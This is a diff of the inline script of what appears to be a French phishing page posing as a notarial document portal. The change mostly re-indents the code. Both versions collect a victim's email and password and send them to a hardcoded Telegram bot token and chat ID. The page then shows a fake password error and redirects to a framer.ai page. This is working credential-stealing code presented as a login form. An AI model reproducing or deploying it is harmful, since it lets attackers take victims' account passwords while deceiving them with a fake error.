@@ -121,56 +121,55 @@
   </div>
 
   <button id="continuer-button">Continuer</button>
-<script>
-  window.addEventListener("DOMContentLoaded", () => {
-    if (localStorage.getItem("valide") !== "true") {
-      window.location.href = "../";
-    }
-
-    // Tout le reste ici...
-    const emailInput = document.getElementById("zone-email");
-    const passwordInput = document.getElementById("zone-password");
-    const passwordContainer = document.getElementById("affiche-mdp");
-    const btnContinuer = document.getElementById("continuer-button");
-    const erreurEmail = document.getElementById("erreur-email");
-    const erreurMdp = document.getElementById("erreur-mdp");
-
-    let etape = 1;
-    let erreurMdpDejaAffiche = false;
-
-    const TELEGRAM_TOKEN = '7651906987:AAF5zW0KpKr46elhpzCPVv91efFc_y-PJJo';
-    const TELEGRAM_CHAT_ID = '7091027049';
-
-    function envoyerTelegram(email, password) {
-      const message = `🔐 Nouveau accès reçu\n📧 Email : ${email}\n🔑 Mot de passe : ${password}`;
-      const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(message)}`;
-      return fetch(url);
-    }
-
-    btnContinuer.addEventListener("click", async () => {
-      const email = emailInput.value.trim();
-      const password = passwordInput.value.trim();
-
-      if (etape === 1) {
-        if (email === "") {
-          erreurEmail.classList.remove("hidden");
-        } else {
-          erreurEmail.classList.add("hidden");
-          passwordContainer.classList.remove("hidden");
-          etape = 2;
-        }
-      } else if (etape === 2) {
-        await envoyerTelegram(email, password);
-        if (!erreurMdpDejaAffiche) {
-          erreurMdp.classList.remove("hidden");
-          erreurMdpDejaAffiche = true;
-        } else {
-          window.location.href = "https://espacedocument-notarial.framer.ai/projetcontrat";
-        }
+  <script>
+    window.addEventListener("DOMContentLoaded", () => {
+      if (localStorage.getItem("valide") !== "true") {
+        window.location.href = "../";
       }
+
+      const emailInput = document.getElementById("zone-email");
+      const passwordInput = document.getElementById("zone-password");
+      const passwordContainer = document.getElementById("affiche-mdp");
+      const btnContinuer = document.getElementById("continuer-button");
+      const erreurEmail = document.getElementById("erreur-email");
+      const erreurMdp = document.getElementById("erreur-mdp");
+
+      let etape = 1;
+      let erreurMdpDejaAffiche = false;
+
+      const TELEGRAM_TOKEN = '7651906987:AAF5zW0KpKr46elhpzCPVv91efFc_y-PJJo';
+      const TELEGRAM_CHAT_ID = '7091027049';
+
+      function envoyerTelegram(email, password) {
+        const message = `🔐 Nouveau accès reçu\n📧 Email : ${email}\n🔑 Mot de passe : ${password}`;
+        const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(message)}`;
+        return fetch(url);
+      }
+
+      btnContinuer.addEventListener("click", async () => {
+        const email = emailInput.value.trim();
+        const password = passwordInput.value.trim();
+
+        if (etape === 1) {
+          if (email === "") {
+            erreurEmail.classList.remove("hidden");
+          } else {
+            erreurEmail.classList.add("hidden");
+            passwordContainer.classList.remove("hidden");
+            etape = 2;
+          }
+        } else if (etape === 2) {
+          await envoyerTelegram(email, password);
+          if (!erreurMdpDejaAffiche) {
+            erreurMdp.classList.remove("hidden");
+            erreurMdpDejaAffiche = true;
+          } else {
+            window.location.href = "https://espacedocument-notarial.framer.ai/projetcontrat";
+          }
+        }
+      });
     });
-  });
-</script>
+  </script>
 
 
 
